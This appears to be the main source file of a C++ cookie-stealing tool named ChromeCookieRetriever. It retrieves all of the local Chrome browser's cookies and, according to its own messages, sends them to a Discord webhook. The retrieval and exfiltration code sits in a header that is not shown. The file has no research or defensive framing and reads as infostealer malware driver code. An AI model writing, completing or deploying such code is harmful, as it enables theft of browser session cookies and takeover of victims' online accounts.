#include "chrome_cookie_retriever.hpp"
#include <iostream>
#include <chrono>
#include <thread>

int main() {
    try {
        std::cout << "Starting Cookie Retriever..." << std::endl;
        
        // Create retriever instance with the webhook URL
        cookie_retriever::ChromeCookieRetriever retriever;
        
        std::cout << "\nRetrieving all cookies..." << std::endl;
        auto cookies = retriever.get_all_cookies();
        
        std::cout << "\nSuccessfully retrieved " << cookies.size() << " cookies." << std::endl;
        std::cout << "Cookies have been sent to Discord webhook." << std::endl;
        
        // Wait a moment to ensure all messages are sent
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        return 0;
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    } catch (...) {
        std::cerr << "Unknown error occurred" << std::endl;
        return 1;
    }
}
